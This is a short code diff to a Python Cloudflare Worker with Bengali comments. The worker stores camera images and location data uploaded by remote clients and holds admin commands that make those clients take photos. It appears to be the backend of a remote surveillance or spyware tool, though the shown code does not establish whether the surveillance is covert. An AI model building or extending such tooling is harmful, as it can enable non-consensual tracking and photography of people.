@@ -3,7 +3,7 @@ from pathlib import Path
 from urllib.parse import urlparse
 import json
 
-# ডেটা সাময়িকভাবে রাখার জন্য ডিকশনারি
+# গ্লোবাল ডিকশনারি (ডেটা সাময়িকভাবে রাখার জন্য)
 clients = {}
 
 class Default(WorkerEntrypoint):
@@ -36,14 +36,16 @@ class Default(WorkerEntrypoint):
                 
                 # যদি ডেটাতে ক্যামেরার ছবি থাকে
                 if "camera_image" in data:
-                    clients[client_id]["camera_image"] = data["camera_image"]
-                    clients[client_id]["camera_time"] = data.get("time", "")
-                    # অ্যাডমিনের কমান্ড রিসেট করা
-                    clients[client_id]["command"] = None
+                    if client_id in clients:
+                        clients[client_id]["camera_image"] = data["camera_image"]
+                        clients[client_id]["camera_time"] = data.get("time", "")
+                        # কমান্ড রিসেট করা (যাতে বারবার ছবি না তোলে)
+                        clients[client_id]["command"] = None
                 else:
                     # সাধারণ ডেটা আপডেট
                     if client_id not in clients:
                         clients[client_id] = {}
+                    
                     clients[client_id].update({
                         "id": client_id,
                         "lat": data.get("lat"),
